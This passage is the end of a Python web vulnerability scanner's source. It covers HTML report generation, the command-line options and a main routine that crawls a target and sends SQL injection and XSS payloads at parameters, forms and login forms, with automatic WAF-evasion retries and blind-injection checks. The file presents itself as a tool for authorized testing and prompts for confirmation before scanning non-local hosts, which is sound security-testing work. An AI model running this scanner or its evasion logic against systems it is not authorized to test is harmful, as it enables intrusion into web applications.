            continue
        badge = f.kind.upper() if f.vulnerable else "WAF-BLOCKED"
        color = "#c0392b" if f.vulnerable else "#d68910"
        rows.append(
            f"<tr><td>{html_mod.escape(f.location)}</td><td>{html_mod.escape(f.param)}</td>"
            f"<td><code>{html_mod.escape(f.payload)}</code></td>"
            f"<td style='color:{color};font-weight:bold'>{badge}"
            f"{' (' + html_mod.escape(f.bypassed_with) + ')' if f.bypassed_with else ''}</td>"
            f"<td>{html_mod.escape(f.detail)}</td></tr>"
        )
    vuln_count = sum(1 for f in findings if f.vulnerable)
    blocked_count = sum(1 for f in findings if f.waf_blocked and not f.vulnerable)
    body = f"""<!doctype html><html><head><meta charset="utf-8">
<title>SQLi_XSS_tester report</title>
<style>
body{{font-family:system-ui,sans-serif;margin:2rem;background:#0f1117;color:#e6e6e6}}
table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #333;padding:6px 10px;text-align:left;font-size:14px}}
th{{background:#1b1e27}}
code{{background:#1b1e27;padding:2px 4px;border-radius:3px}}
</style></head><body>
<h1>SQLi_XSS_tester report</h1>
<p>Target: <code>{html_mod.escape(target)}</code></p>
<p>Tested payloads: {len(findings)} | Vulnerable: {vuln_count} | WAF-blocked: {blocked_count}</p>
<table><tr><th>Location</th><th>Param</th><th>Payload</th><th>Result</th><th>Detail</th></tr>
{''.join(rows) if rows else '<tr><td colspan=5>No vulnerabilities or WAF blocks recorded.</td></tr>'}
</table>
</body></html>"""
    with open(path, "w") as fh:
        fh.write(body)

# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def parse_headers(pairs):
    out = {}
    for pair in pairs or []:
        if ":" not in pair:
            continue
        k, v = pair.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def build_arg_parser():
    ap = argparse.ArgumentParser(
        description="SQLi + XSS scanner with blind-injection detection and WAF-evasion (stdlib only). Authorized testing only.",
    )
    ap.add_argument("-u", "--url", required=True, help="Target URL, e.g. http://target/")
    ap.add_argument("-t", "--timeout", type=float, default=10, help="Per-request timeout in seconds")
    ap.add_argument("-w", "--workers", type=int, default=8, help="Concurrent worker threads")
    ap.add_argument("--delay", type=float, default=0, help="Random jitter (0..delay s) between requests")
    ap.add_argument("--max-pages", type=int, default=20, help="Max pages to crawl for forms/links")
    ap.add_argument("--no-crawl", action="store_true", help="Only test the given URL, skip link crawling")
    ap.add_argument("--no-forms", action="store_true", help="Skip form discovery/testing")
    ap.add_argument("--no-blind", action="store_true", help="Skip boolean/time-based blind SQLi checks (faster)")
    ap.add_argument("-q", "--quick", action="store_true",
                     help=f"Use small curated payload subsets ({len(QUICK_SQLI_PAYLOADS)} SQLi / "
                          f"{len(QUICK_XSS_PAYLOADS)} XSS) for fast triage instead of the full arsenal "
                          f"({len(SQLI_PAYLOADS)} SQLi / {len(XSS_PAYLOADS)} XSS, default)")
    ap.add_argument("--bypass", action="store_true", default=True,
                     help="Auto-retry WAF-blocked payloads with alternate encodings (default: on)")
    ap.add_argument("--no-bypass", dest="bypass", action="store_false")
    ap.add_argument("--cookie", help="Raw Cookie header, e.g. 'PHPSESSID=abc; role=admin'")
    ap.add_argument("-H", "--header", action="append", help="Extra header 'Name: value' (repeatable)")
    ap.add_argument("--user-agent", help="Override User-Agent")
    ap.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080 (Burp/ZAP)")
    ap.add_argument("-o", "--output", help="Write JSON findings report to this path")
    ap.add_argument("--html-report", help="Write an HTML findings report to this path")
    ap.add_argument("-y", "--yes", action="store_true", help="Skip the confirmation prompt")
    ap.add_argument("-v", "--verbose", action="store_true", help="Print every test, not just hits")
    return ap


def confirm_scope(url, assume_yes):
    host = urllib.parse.urlsplit(url).hostname or ""
    if assume_yes or host in ("127.0.0.1", "localhost", "::1"):
        return True
    log(paint("[!] You are about to send attack payloads to a non-local target.", C.YELLOW))
    log(f"    Target: {url}")
    log("    Only proceed if you own this system or have explicit written authorization.")
    try:
        answer = input("    Type 'yes' to continue: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return answer == "yes"


def main():
    args = build_arg_parser().parse_args()

    if not confirm_scope(args.url, args.yes):
        log(paint("[!] Aborted - scope not confirmed.", C.RED))
        sys.exit(1)

    client = HttpClient(
        timeout=args.timeout,
        user_agent=args.user_agent,
        extra_headers=parse_headers(args.header),
        proxy=args.proxy,
        cookie_header=args.cookie,
    )
    scanner = Scanner(client, args)
    if args.no_blind:
        scanner.scan_sqli_boolean_blind = lambda *a, **k: None
        scanner.scan_sqli_time_blind = lambda *a, **k: None

    log(paint(
        f"[*] Starting SQLi/XSS scan on: {args.url} "
        f"({len(scanner.sqli_payloads)} SQLi + {len(scanner.xss_payloads)} XSS payloads/injection point)",
        C.CYAN,
    ))

    first = client.request(args.url)
    if first.error:
        log(paint(f"[!] Could not reach {args.url}: {first.error}", C.RED))
        sys.exit(1)

    if args.no_crawl:
        pages = [(args.url, first.text)]
        forms = [(args.url, f) for f in extract_forms(first.text)] if not args.no_forms else []
    else:
        pages, forms = crawl(client, args.url, max_pages=args.max_pages)
        if args.no_forms:
            forms = []
    log(paint(f"[+] Crawled {len(pages)} page(s), found {len(forms)} form(s).", C.CYAN))

    jobs = []
    urls_to_probe = {args.url} | {p for p, _ in pages}
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        for u in urls_to_probe:
            jobs.append(pool.submit(scanner.scan_query_params, u))
        for page_url, form in forms:
            jobs.append(pool.submit(scanner.scan_generic_form, page_url, form))
            jobs.append(pool.submit(scanner.scan_login_form, page_url, form))
        try:
            for j in concurrent.futures.as_completed(jobs):
                j.result()
        except KeyboardInterrupt:
            log(paint("\n[!] Interrupted - showing partial results.", C.YELLOW))

    vuln = [f for f in scanner.findings if f.vulnerable]
    blocked = [f for f in scanner.findings if f.waf_blocked and not f.vulnerable]
    log(paint(f"\n[*] Scan completed. Tested {scanner.tested} requests.", C.CYAN))
    log(paint(f"    Vulnerable findings: {len(vuln)}", C.RED if vuln else C.GREEN))
    log(paint(f"    WAF-blocked (not bypassed): {len(blocked)}", C.YELLOW))

    if args.output:
        write_json_report(scanner.findings, args.output)
        log(f"[*] JSON report written to {args.output}")
    if args.html_report:
        write_html_report(scanner.findings, args.html_report, args.url)
        log(f"[*] HTML report written to {args.html_report}")


if __name__ == "__main__":
    main()
